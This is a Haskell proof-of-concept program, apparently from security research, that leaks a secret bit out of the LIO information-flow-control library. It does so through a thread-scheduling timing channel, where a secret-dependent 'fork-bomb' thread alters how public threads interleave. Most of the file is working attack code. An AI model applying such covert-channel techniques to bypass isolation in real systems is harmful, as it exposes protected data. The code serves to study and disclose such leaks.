{-
  Compile with `stack build`
  Run with `stack exec -- fork-bomb SECRET +RTS -N2` or
           `stack exec -- fork-bomb SECRET True +RTS -N2 -C0`
    where SECRET is 1 or 0
    if SECRET == 1, then it will do the forkbomb
    otherwise it will not
  
  Note:
    The analysis code to use depends on the presence of the -C0 argument. This
    simply sets the RTS to context switch on each loop in the scheduler. It is
    often used to get deterministic results. This attack should work with or
    without it
-}


import System.Environment
import qualified Data.Array.IO as Array
import qualified Data.ByteString as ByteString
import qualified Control.Exception as Exception
import Data.IORef

import LIO
import LIO.LIORef
import LIO.DCLabel
import LIO.Concurrent

import LIO.Run
import LIO.TCB (ioTCB)

import Prelude hiding (max,min)
import Control.Monad
import Data.List

import Control.Concurrent

import Common

len = 100000

highThread :: DC (DCLabeled Int) -> DC Int
highThread secret = do
  secret <- secret
  let cap1 = 1
  sec <- unlabel secret
  case sec of
    1 -> do
      s1 <- hFork 3 secretL (busyWait' len)
      t1 <- busyWait 100000
      --res <- lWait s1
      return 0
    _ -> do
      t1 <- busyWait 100000
      return 0

analyzePublicChannel :: LIORef DCLabel [String] -> DC Int
analyzePublicChannel publicChannel = do
  ref <- readLIORef publicChannel
  let acc = map (\x -> (head x, length x)) (group ref)
  -- If the attack does not work, uncomment the following.
  -- This will provide details into what the public channel looks like.
  -- This can be eyeballed to understand how your machine is scheduling
  -- threads. Then, change the case statement accordingly
  let (str,(_,count)) = channelToStringLast acc
  let (str',(_,count')) = channelToStringHead acc
  () <- ioTCB $ print str'
  () <- ioTCB $ print str
  () <- ioTCB $ print $ length acc
  case length acc of
    count | count < 100 -> return 1
    _                   -> return 0

runLowThreads :: (LIORef DCLabel [String] -> DC Int) -> DC Int
runLowThreads analyzer = do
  publicChannel <- newLIORef publicL []
  let cap1 = 1
  let cap2 = 2
  t1 <- hFork 2 publicL (cap1Write len publicChannel)
  t2 <- hFork 3 publicL (cap2Write len publicChannel)
  _  <- busyWait 100000
  () <- lWait t1
  () <- lWait t2
  analyzer publicChannel

mainDC :: DC (DCLabeled Int) -> DC Int
mainDC secret = do
  l <- getLabel
  let cap1 = 1
  let cap2 = 2
  t1 <- hFork 2 publicL (runLowThreads analyzePublicChannel)
  t2 <- hFork 3 secretL (highThread secret)
  r2 <- lWait t2
  r1 <- lWait t1 -- Should be the secret!
  return r1

main :: IO ()
main = do
  l <- getArgs
  let secret = getArg l
  secret <- evalLIO (mainDC (label secretL secret)) initialLabelState
  print $ "The secret is... " ++ (show secret)
  return ()
